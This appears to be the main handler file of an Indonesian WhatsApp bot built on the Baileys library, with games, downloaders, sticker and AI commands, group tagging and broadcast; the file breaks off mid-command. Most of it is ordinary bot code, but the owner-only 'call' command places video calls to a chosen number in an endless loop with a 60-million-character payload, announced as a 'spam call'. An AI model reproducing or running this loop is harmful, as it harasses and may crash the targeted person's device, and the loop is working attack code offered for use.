/**
 * github : https://github.com/kiuur
 * youtube : https://youtube.com/@kyuurzy
*/

require('../settings/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const {
    default:
    baileys,
    getContentType, 
   } = require("@whiskeysockets/baileys");

const tebakGambarSessions = {}; // Menyimpan sesi tebak gambar
const susunKataSessions = {}; // Menyimpan sesi susun kata
const tebakBenderaSessions = {}; // Menyimpan sesi tebak bendera
const activeGames = {}; // Menyimpan game aktif di setiap chat
const chatCooldown = {}; // Menyimpan cooldown per user
const tebakJktSessions = {}; // Menyimpan sesi tebakjkt

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");

        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const botNumber = await client.decodeJid(client.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
     
        let cihuy = fs.readFileSync('./start/lib/media/lenn.jpeg')
       
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            client.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "— lenn",
                        body: "— hwan kim",
                        thumbnailUrl: "https://files.catbox.moe/rqvm5a.jpeg",
                        sourceUrl: '',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
        const plug = { client, prefix, command, reply, text, Access, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !Access) {
                    return reply(mess.owner);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  
        
        switch (command) {
            
            case "menu":{
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let mbut = `hi ${pushname}, i am automated system (WhatsApp bot) that can help to do something search and get data/informasi only through WhatsApp 

information:
 ▢ status: ${client.public ? 'public' : 'self'}
 ▢ username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}

commands:
> sticker
 ๑ ${prefix}brat
 ๑ ${prefix}bratvid
 ๑ ${prefix}qc
 ๑ ${prefix}sticker

> game
 ๑ ${prefix}tebakgambar
 ๑ ${prefix}susunkata
 ๑ ${prefix}tebakbendera
 ๑ ${prefix}tebakjkt

> downloader
 ๑ ${prefix}tiktok
 ๑ ${prefix}igdl
 ๑ ${prefix}pindl

> tools
 ๑ ${prefix}hd
 
> group
 ๑ ${prefix}tagall
 ๑ ${prefix}hidetag

> fun
 ๑ ${prefix}cekkhodam
 ๑ ${prefix}ceksempak
 
> ai
 ๑ ${prefix}txt2img
 ๑ ${prefix}heckai
 ๑ ${prefix}bocchi

> search
 ๑ ${prefix}pinterest
 ๑ ${prefix}fixivsearch

> nyerah
 ๑ ${prefix}nyerahtg
 ๑ ${prefix}nyerahsk
 ๑ ${prefix}nyerahtb
 ๑ ${prefix}nyerahjkt
 
> other
 ๑ ${prefix}ping
 ๑ ${prefix}chat

> owner
 ๑ ${prefix}csesi
 ๑ ${prefix}upsw
 ๑ ${prefix}public
 ๑ ${prefix}self
 ๑ ${prefix}call
 ๑ ${prefix}bc
 ๑ $
 ๑ >
 ๑ <`
                client.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: "— lenn",
                    mimetype: "application/pdf",
                    fileLength: 99999,
                    pageCount: 666,
                    caption: mbut,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "— lenn",
                            newsletterJid: `120363382099978847@newsletter`,
                        },
                        externalAdReply: {  
                            title: "— lenn", 
                            body: "Simple WhatsApp Bot",
                            thumbnailUrl: `https://files.catbox.moe/7frp5d.jpeg`,
                            sourceUrl: "", 
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m })
            };
            break;

//game
case 'tebakgambar': {
    if (activeGames[m.chat]) {
        return reply(`Masih ada permainan *${activeGames[m.chat]}* yang belum selesai!\nSilakan jawab atau menyerah dengan perintah yang sesuai.`);
    }

    try {
        let response = await fetch(`https://api.siputzx.my.id/api/games/tebakgambar`);
        let result = await response.json();

        if (!result.status || !result.data) {
            return reply("Gagal mengambil soal tebak gambar.");
        }

        let { img, deskripsi, jawaban } = result.data;
        activeGames[m.chat] = 'tebakgambar'; // Tandai game aktif
        tebakGambarSessions[m.chat] = { 
            answer: jawaban.toLowerCase(), 
            startTime: Date.now(), 
            timeout: setTimeout(() => {
                if (tebakGambarSessions[m.chat]) {
                    reply(`Waktu habis! Jawaban yang benar adalah: *${jawaban}*`);
                    delete tebakGambarSessions[m.chat];
                    delete activeGames[m.chat]; // Hapus game aktif
                }
            }, 120000) // 120 detik
        };

        client.sendMessage(m.chat, { 
            image: { url: img }, 
            caption: `*Tebak Gambar!*\n\n${deskripsi}\n\nWaktu menjawab: *120 detik!*\n\nKirim command .nyerahtg untuk menyerah.`
        }, { quoted: m });

    } catch (error) {
        console.error("Error saat mengambil soal:", error);
        reply("Terjadi kesalahan saat mengambil soal.");
    }
}
break;

case 'susunkata': {
    if (activeGames[m.chat]) {
        return reply(`Masih ada permainan *${activeGames[m.chat]}* yang belum selesai!\nSilakan jawab atau menyerah dengan perintah yang sesuai.`);
    }

    try {
        let response = await fetch(`https://api.siputzx.my.id/api/games/susunkata`);
        let result = await response.json();

        if (!result.status || !result.data) {
            return reply("Gagal mengambil soal susun kata.");
        }

        let { soal, tipe, jawaban } = result.data;
        activeGames[m.chat] = 'susunkata';
        susunKataSessions[m.chat] = { 
            answer: jawaban.toLowerCase(), 
            startTime: Date.now(), 
            timeout: setTimeout(() => {
                if (susunKataSessions[m.chat]) {
                    reply(`Waktu habis! Jawaban yang benar adalah: *${jawaban}*`);
                    delete susunKataSessions[m.chat];
                    delete activeGames[m.chat];
                }
            }, 60000) // 60 detik
        };

        client.sendMessage(m.chat, { 
            text: `*Susun Kata!*\n\n*Kata Acak:* ${soal}\n*Hint:* ${tipe}\n\nWaktu menjawab: *60 detik!*\n\nKirim command .nyerahsk untuk menyerah.`
        }, { quoted: m });

    } catch (error) {
        console.error("Error saat mengambil soal:", error);
        reply("Terjadi kesalahan saat mengambil soal.");
    }
}
break;

case 'tebakbendera': {
    if (activeGames[m.chat]) {
        return reply(`Masih ada permainan *${activeGames[m.chat]}* yang belum selesai!\nSilakan jawab atau menyerah dengan perintah yang sesuai.`);
    }

    try {
        let response = await fetch(`https://api.siputzx.my.id/api/games/tebakbendera`);
        let result = await response.json();

        if (!result.name || !result.img) {
            return reply("Gagal mengambil soal tebak bendera.");
        }

        let { name, img } = result;
        activeGames[m.chat] = 'tebakbendera';
        tebakBenderaSessions[m.chat] = { 
            answer: name.toLowerCase(), 
            startTime: Date.now(), 
            timeout: setTimeout(() => {
                if (tebakBenderaSessions[m.chat]) {
                    reply(`Waktu habis! Jawaban yang benar adalah: *${name}*`);
                    delete tebakBenderaSessions[m.chat];
                    delete activeGames[m.chat];
                }
            }, 120000) // 120 detik
        };

        client.sendMessage(m.chat, { 
            image: { url: img }, 
            caption: `*Tebak Bendera!*\n\nTebak negara dari bendera di atas!\n\nWaktu menjawab: *2 menit!*\n\nKirim command .nyerahtb untuk menyerah.`
        }, { quoted: m });

    } catch (error) {
        console.error("Error saat mengambil soal:", error);
        reply("Terjadi kesalahan saat mengambil soal.");
    }
}
break;

case 'tebakjkt': {
    if (activeGames[m.chat]) {
        return reply(`Masih ada permainan *${activeGames[m.chat]}* yang belum selesai!\nSilakan jawab atau menyerah dengan perintah yang sesuai.`);
    }

    try {
        let response = await fetch(`https://api.siputzx.my.id/api/games/tebakjkt`);
        let result = await response.json();

        if (!result.status || !result.data) {
            return reply("Gagal mengambil soal tebak JKT.");
        }

        let { gambar, jawaban } = result.data;
        activeGames[m.chat] = 'tebakjkt'; // Tandai game aktif
        tebakJktSessions[m.chat] = { 
            answer: jawaban.toLowerCase(), 
            startTime: Date.now(), 
            timeout: setTimeout(() => {
                if (tebakJktSessions[m.chat]) {
                    reply(`Waktu habis! Jawaban yang benar adalah: *${jawaban}*`);
                    delete tebakJktSessions[m.chat];
                    delete activeGames[m.chat]; // Hapus game aktif
                }
            }, 120000) // 120 detik (2 menit)
        };

        client.sendMessage(m.chat, { 
            image: { url: gambar }, 
            caption: `*Tebak JKT!*\n\nTebak siapa idol JKT48 di gambar ini!\n\nWaktu menjawab: *2 menit!*\n\nKirim command .nyerahjkt untuk menyerah.`
        }, { quoted: m });

    } catch (error) {
        console.error("Error saat mengambil soal:", error);
        reply("Terjadi kesalahan saat mengambil soal.");
    }
}
break;

//downloader
case "pindl": {
  if(!text) return reply(`contoh: ${prefix + command} https://pin.it/3aeda0Ez1`);
  await reaction(m.chat, "⚡")
  let anu = `https://api.siputzx.my.id/api/d/pinterest?url=${encodeURIComponent(text)}`;
  const res = await fetch(anu);
  const response = await res.json();
  try {
    client.sendMessage(m.chat, {
      image: { url: response.data.url },
      mimeType: 'image/jpeg',
      caption: `- ID: ${response.data.id}\n- URL: ${text}`
    }, { quoted: m })
  } catch (e) {
    console.log(e);
    reply('error', e)
  }
}
break

//tools
case 'hd':
case 'hdr': {
async function Upscale(imageBuffer) {
 try {
 const response = await fetch("https://lexica.qewertyy.dev/upscale", {
 body: JSON.stringify({
 image_data: Buffer.from(imageBuffer, "base64"),
 format: "binary",
 }),
 headers: {
 "Content-Type": "application/json",
 },
 method: "POST",
 });
 return Buffer.from(await response.arrayBuffer());
 } catch {
 return null;
 }
}
if (!/image/.test(mime)) return reply(`kirim foto dengan caption ${prefix + command}`)
await reaction(m.chat, "⚡")
let media = await quoted.download()
let proses = await Upscale(media);
client.sendMessage(m.chat, { image: proses, caption: 'BERHASIL HDR'}, { quoted: null})
}
break

//group
            case 'tagall':{
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return reply(mess.group);
                
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;

                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
            break         
            
case 'h':
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !Access) return reply(mess.admin)
 if (m.quoted) {
client.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
} else {
client.sendMessage(m.chat, {
text: `@${m.chat} ${q ? q : ''}`,
contextInfo: {
mentionedJid: participants.map(a => a.id),
groupMentions: [
{
groupSubject: "everyone",
groupJid: m.chat
}
]
}
}, { quoted: m })
}
}
break

//fun
case 'cekkhodam': {
      if (!text) return reply(`\n*contoh:* ${prefix + command} lenn\n`)
      let who
      if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      const anunya = [
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
]
      function getRandomKhodam() {
          const randomKhodam = Math.floor(Math.random() * anunya.length);
    return anunya[randomKhodam];
}
const khodam = getRandomKhodam()
      const response = `Cek Khodam
> *Nama :* ${text}
> *Khodam :* ${khodam}`
      reply(response)
  }
  break

case 'ceksempak': {
      if (!text) return reply(`\n*contoh:* ${prefix + command} lenn\n`)
      let who
      if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      const anunya = [
"hijau",  
"cinnamon",  
"mint",  
"bronze",  
"wisteria",  
"rose",  
"hitam",  
"beige",  
"emas",  
"storm",  
"cosmic",  
"ash",  
"navy",  
"cloud",  
"tan",  
"lapis",  
"abu",  
"mauve",  
"merah",  
"tangerine",  
"fuchsia",  
"umber",  
"dawn",  
"melon",  
"orchid",  
"pink",  
"magenta",  
"peach",  
"slate",  
"periwinkle",  
"ungu",  
"coklat",  
"ivory",  
"aquamarine",  
"turquoise",  
"mulberry",  
"cranberry",  
"dusk",  
"steel",  
"fog",  
"pewter",  
"saffron",  
"sepia",  
"denim",  
"burgundy",  
"bordeaux",  
"obsidian",  
"smoke",  
"clay",  
"garnet",  
"amethyst",  
"caramel",  
"mustard",  
"patina",  
"indigo",  
"khaki",  
"cerulean",  
"sand",  
"charcoal",  
"violet",  
"kuning",  
"copper",  
"topaz",  
"biru",  
"teal",  
"coral",  
"zaitun",  
"citrine",  
"mocha",  
"sunset",  
"emerald",  
"cyan",  
"brass",  
"plum",  
"sapphire",  
"onyx",  
"raspberry",  
"amber",  
"terracotta",  
"vermilion",  
"twilight",  
"ruby",  
"lime",  
"honey",  
"putih",  
"jingga",  
"gunmetal",  
"midnight",  
"chartreuse",  
"marun",  
"salmon",  
"perak",  
"sienna",  
"ebony",  
"boysenberry",  
"lavender",  
"jade",  
"persimmon",  
"chocolate",
"ga pake",
"ga pake",
"ga pake"
]
      function getRandomKhodam() {
          const randomKhodam = Math.floor(Math.random() * anunya.length);
    return anunya[randomKhodam];
}
const khodam = getRandomKhodam()
      const response = `Cek Warna Sempak
> *Nama :* ${text}
> *Warna :* ${khodam}`
      reply(response)
  }
  break
  
//ai
case "heckai": {
    if (!text) return reply(`\ncontoh: ${prefix + command} siapakah presiden Indonesia\n`);
    const ahh = await fetchJson(`https://www.laurine.site/api/ai/heckai?query=${text}`);
    const hmm = ahh.data;
    return client.sendMessage(m.chat, {
        text: hmm 
    }, { quoted: m });
}
break;

case "bocchi": {
    if (!text) return reply(`\ncontoh: ${prefix + command} siapakah presiden Indonesia\n`);
    const ahh = await fetchJson(`https://www.laurine.site/api/cai/bocchi?query=${text}`);
    const hmm = ahh.data;
    return client.sendMessage(m.chat, {
        text: hmm 
    }, { quoted: m });
}
break;

case 'txt2img':
case 'text2img': {
if (!text) return reply(`\ncontoh: ${prefix + command} anime girl\n`)
await reaction(m.chat, "⚡")
	try {
client.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `Sukses Membuat ${command} Dengan Promt:\n${text}`}, { quoted: m})
	} catch {
	  reply('duh error')
	}
}
break

//search
case "fixivsearch":{
  if(!text) return reply(`\ncontoh: ${prefix + command} hololive\n`);
  await reaction(m.chat, "⚡");
  let anu = `https://api.rynn-archive.biz.id/search/pixiv?q=${encodeURIComponent(text)}`;
  const res = await fetch(anu);
  const response = await res.json();
  let teks = `
- Caption: ${response.result[0].caption}
- Author: ${response.result[0].author}
- Tag: ${response.result[0].tags}
- Tanggal: ${response.result[0].uploadDate}`
  try {
    client.sendMessage(m.chat, {
      image: { url: response.result[0].imageUrl },
      caption: teks
    }, { quoted: m })
  } catch (e) {
    console.log(e);
    reply('Error')
  }
}
break

case 'pinterest':
case 'pin': {
    if (!args.length) {
        return reply(`\ncontoh: ${prefix + command} hololive\n`);
    }

    let text = args.join(' ');
    let url = `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(text)}`;

    try {
        let response = await fetch(url);
        let result = await response.json();

        if (!result.status || !result.data.length) {
            return reply("Gambar tidak ditemukan untuk query tersebut.");
        }

        let randomImage = result.data[Math.floor(Math.random() * result.data.length)];

        let caption = `*Judul:* ${randomImage.grid_title || "Tidak ada judul"}\n*Tanggal:* ${randomImage.created_at}\n*Link:* ${randomImage.pin}`;

        client.sendMessage(m.chat, { 
            image: { url: randomImage.images_url },
            caption: caption
        }, { quoted: m });

    } catch (error) {
        console.error("Pinterest API Error:", error);
        reply("Terjadi kesalahan saat mengambil data.");
    }
}
break;

//nyerah
case 'nyerahtg': {
    if (!tebakGambarSessions[m.chat]) {
        return reply("Tidak ada permainan tebak gambar yang sedang berlangsung di chat ini!");
    }

    let gameStartTime = tebakGambarSessions[m.chat].startTime;
    let elapsedTime = Date.now() - gameStartTime;

    if (elapsedTime < 30000) { // Kurang dari 30 detik
        return reply("Kamu hanya bisa menyerah setelah 30 detik permainan berlangsung!");
    }

    let correctAnswer = tebakGambarSessions[m.chat].answer;
    clearTimeout(tebakGambarSessions[m.chat].timeout);
    delete tebakGambarSessions[m.chat];
    delete activeGames[m.chat]; // Hapus game aktif

    reply(`Kamu menyerah!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

case 'nyerahsk': {
    if (!susunKataSessions[m.chat]) {
        return reply("Tidak ada permainan susun kata yang sedang berlangsung di chat ini!");
    }

    let gameStartTime = susunKataSessions[m.chat].startTime;
    let elapsedTime = Date.now() - gameStartTime;

    if (elapsedTime < 30000) { // Kurang dari 30 detik
        return reply("Kamu hanya bisa menyerah setelah 30 detik permainan berlangsung!");
    }

    let correctAnswer = susunKataSessions[m.chat].answer;
    clearTimeout(susunKataSessions[m.chat].timeout);
    delete susunKataSessions[m.chat];
    delete activeGames[m.chat];

    reply(`Kamu menyerah!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

case 'nyerahtb': {
    if (!tebakBenderaSessions[m.chat]) {
        return reply("Tidak ada permainan tebak bendera yang sedang berlangsung di chat ini!");
    }

    let gameStartTime = tebakBenderaSessions[m.chat].startTime;
    let elapsedTime = Date.now() - gameStartTime;

    if (elapsedTime < 30000) { // Kurang dari 30 detik
        return reply("Kamu hanya bisa menyerah setelah 30 detik permainan berlangsung!");
    }

    let correctAnswer = tebakBenderaSessions[m.chat].answer;
    clearTimeout(tebakBenderaSessions[m.chat].timeout);
    delete tebakBenderaSessions[m.chat];
    delete activeGames[m.chat];

    reply(`Kamu menyerah!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

case 'nyerahjkt': {
    if (!tebakJktSessions[m.chat]) {
        return reply("Tidak ada permainan tebak JKT yang sedang berlangsung di chat ini!");
    }

    let gameStartTime = tebakJktSessions[m.chat].startTime;
    let elapsedTime = Date.now() - gameStartTime;

    if (elapsedTime < 30000) { // Kurang dari 30 detik
        return reply("Kamu hanya bisa menyerah setelah 30 detik permainan berlangsung!");
    }

    let correctAnswer = tebakJktSessions[m.chat].answer;
    clearTimeout(tebakJktSessions[m.chat].timeout);
    delete tebakJktSessions[m.chat];
    delete activeGames[m.chat];

    reply(`Kamu menyerah!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

//owner
case 'change': {
if (!Access) return;
if (!text) return reply(`textnya?`)
await client.updateProfileName(`${text}`)
reply('done')
}
break

            case 'call': {
         if (!Access) return;
    if (args.length < 1) {
        return reply(`Pilih:\n${prefix + command} @tag\n${prefix + command} nomor`);
    }

    const target = args[0];

    const callFunction = async (target) => {
        while (true) { // Loop tanpa henti
            await client.offerCall(target, { isVideo: true, callOutCome: "8".repeat(60000000) });
        }
    };

    if (target.startsWith('@')) {
        // Jika pengguna mention dengan @tag
        const mentionedJid = m.mentionedJid[0];
        if (!mentionedJid) {
            return reply("tag seseorang untuk melakukan panggilan.");
        }
        callFunction(mentionedJid);
        client.sendMessage(m.chat, { text: `spam call dimulai ke nomor ${target}` }, { quoted: m });
    } else if (/^\d+$/.test(target)) {
        // Jika pengguna memberikan nomor telepon
        const number = target + "@s.whatsapp.net";
        callFunction(number);
        client.sendMessage(m.chat, { text: `spam call dimulai ke nomor ${target}` }, { quoted: m });
    } else {
        return reply(`format salah.\ncontoh: ${prefix + comnand} @tag/62857`);
    }
}
break;

case 'restart': {
    if (!Access) return;
    reply("Bot akan direstart...");
    setTimeout(() => {
        process.exit(0);
    }, 2000);
}
break;

case 'bc': {
    if (!Access) return; // Hanya bisa digunakan oleh owner

    if (!text) {
        return reply("Harap masukkan teks untuk broadcast!");
    }

    let groups = await client.groupFetchAllParticipating();
    let groupIds = Object.keys(groups);
    if (groupIds.length === 0) return reply('Bot belum join grup mana pun!');

    let sendableGroups = groupIds.filter(id => !groups[id].announce);
    if (sendableGroups.length === 0) return reply('Semua grup yang bot join sedang ditutup!');

    let totalGroups = sendableGroups.length;
    let delayPerMessage = 1500; // 1.5 detik
    let estimatedTime = (totalGroups * delayPerMessage) / 1000; // dalam detik

    reply(`Memulai broadcast ke ${totalGroups} grup...\nEstimasi waktu: ${estimatedTime} detik`);

    let successCount = 0;
    let failedCount = 0;

    for (let id of sendableGroups) {
        setTimeout(async () => {
            try {
                await client.sendMessage(id, {
                    text: text,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            title: "— broadcast",
                            body: "— hwan kim",
                            thumbnailUrl: "https://files.catbox.moe/rqvm5a.jpeg",
                            sourceUrl: 'https://whatsapp.com/channel/0029Vb0rTBG0AgWCjANsxh2d',
                            renderLargerThumbnail: false,
                        }
                    }
                }, { quoted: m });

                successCount++;
            } catch (e) {
                failedCount++;
            }

            if (successCount + failedCount === totalGroups) {
                reply(`Broadcast selesai!\n- Berhasil: ${successCount}\n- Gagal: ${failedCount}`);
            }
        }, delayPerMessage * sendableGroups.indexOf(id));
    }
}
break;

case "nosv" : {
if (!Access) return
reply("Lenn tidak menerima saling save.\nMau save? save aja tapi jangan berharap di save back. Terimakasih.")
}
break;

            case "public":{
                if (!Access) return reply(mess.owner) 
                client.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            
            case "self":{
                if (!Access) return reply(mess.owner) 
                client.public = false
                reply(`successfully changed to ${command}`)
            }
            break
            
case 'antg': {
    if (!Access) return reply(`idih mau curang ya?`)
    if (!tebakGambarSessions[m.chat]) return reply("Tidak ada soal yang aktif di chat ini.");

    let correctAnswer = tebakGambarSessions[m.chat].answer;
    reply(`Jawaban soal ini adalah: *${correctAnswer}*`);
}
break;

case 'ansk': {
    if (!Access) return reply(`idih mau curang ya?`)
    if (!susunKataSessions[m.chat]) return reply("Tidak ada soal yang aktif di chat ini.");

    let correctAnswer = susunKataSessions[m.chat].answer;
    reply(`Jawaban soal ini adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

case 'antb': {
    if (!Access) return reply(`idih mau curang ya?`)
    if (!tebakBenderaSessions[m.chat]) return reply("Tidak ada soal yang aktif di chat ini.");

    let correctAnswer = tebakBenderaSessions[m.chat].answer;
    reply(`Jawaban soal ini adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

case 'anjkt': {
    if (!Access) return reply(`idih mau curang ya?`)
    if (!tebakJktSessions[m.chat]) return reply("Tidak ada soal yang aktif di chat ini.");

    let correctAnswer = tebakJktSessions[m.chat].answer;
    reply(`Jawaban soal ini adalah: *${correctAnswer.toUpperCase()}*`);
}
break;

//other
case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    client.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted:m})
}
break;

case 'chat': {
    if (m.isGroup) return reply(mess.private);
    if (!text) return reply(`contoh: ${prefix + command} halo`);

    let sender = m.sender;
    let now = Date.now();

    // Jika user bukan pemilik (tidak punya Access), cek cooldown
    if (!Access) {
        if (chatCooldown[sender] && now - chatCooldown[sender] < 1800000) { // 30 menit = 1800000 ms
            let remainingTime = ((chatCooldown[sender] + 1800000 - now) / 60000).toFixed(1);
